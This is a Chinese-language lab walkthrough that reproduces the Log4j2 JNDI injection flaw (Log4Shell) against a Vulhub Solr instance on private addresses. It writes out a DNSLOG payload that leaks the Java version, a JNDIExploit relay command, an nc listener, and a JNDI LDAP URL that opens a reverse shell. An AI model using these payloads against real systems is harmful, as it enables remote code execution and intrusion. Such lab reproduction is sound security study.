Apache Log4j 2
是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。

参考地址：

https://github.com/vulhub/vulhub

本次漏洞复现基于Vulhub

1.启动vulhub

Docker-compose up -d

![1667978687_636b55bf64b7125b5479d.png!small](https://image.3001.net/images/20221109/1667978687_636b55bf64b7125b5479d.png!small)

2.访问地址172.16.7.155:8983

![1667978696_636b55c8ad26d1c52da66.png!small](https://image.3001.net/images/20221109/1667978696_636b55c8ad26d1c52da66.png!small)

利用burp插件查看

![1667978705_636b55d1133197669371d.png!small](https://image.3001.net/images/20221109/1667978705_636b55d1133197669371d.png!small)

发现存在log4j2漏洞

3.为了确保确实存在近一步验证，首先在DNSLOG申请一个dns域名：uhap1t.dnslog.cn

![1667978736_636b55f09e65ca6f5b959.png!small](https://image.3001.net/images/20221109/1667978736_636b55f09e65ca6f5b959.png!small)

构造payload：

${jndi:dns://${sys:java.version}.example.com}是利用JNDI发送DNS请求的Payload：

[http://172.16.7.155:8983/solr/admin/cores?_=1652063831386&wt=json&indexInfo=${jndi:ldap://${sys:java.version}.uhap1t.dnslog.cn}](http://172.16.7.155:8983/solr/admin/cores?_=1652063831386&wt=json&indexInfo=$%7Bjndi:ldap://$%7Bsys:java.version%7D.uhap1t.dnslog.cn%7D)

证明完毕确实存在log4j2漏洞

}

![1667978754_636b56029ebf37c3cecca.png!small](https://image.3001.net/images/20221109/1667978754_636b56029ebf37c3cecca.png!small)

4.利用漏洞反弹shell

反弹shell需要使用JNDIExploit.v1.2

网络拓扑：

![1667978772_636b5614c6c95c1fe7ef2.png!small](https://image.3001.net/images/20221109/1667978772_636b5614c6c95c1fe7ef2.png!small)

首先在中转机上使用JNDIExploit-1.2-SNAPSHOT.jar文件使用java启动，命令如下：

java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.16.7.78

![1667978785_636b5621bdeeb4bd24874.png!small](https://image.3001.net/images/20221109/1667978785_636b5621bdeeb4bd24874.png!small)

然后在攻击机上开启监听：nc -lvvp 1234

![1667978793_636b5629ac6f5aba756d0.png!small](https://image.3001.net/images/20221109/1667978793_636b5629ac6f5aba756d0.png!small)

此时构造如下命令：

[http://172.16.7.155:8983/solr/admin/cores?_=1652063831386&wt=json&indexInfo=${jndi:ldap://172.16.7.78:1389/Basic/ReverseShell/172.16.7.95/1234}](http://172.16.7.155:8983/solr/admin/cores?_=1652063831386&wt=json&indexInfo=$%7Bjndi:ldap://172.16.7.78:1389/Basic/ReverseShell/172.16.7.95/1234%7D)

![1667978803_636b5633beee217509cc1.png!small](https://image.3001.net/images/20221109/1667978803_636b5633beee217509cc1.png!small)

执行后反弹到SHELL

![1667978812_636b563c8008dcf19b673.png!small](https://image.3001.net/images/20221109/1667978812_636b563c8008dcf19b673.png!small)

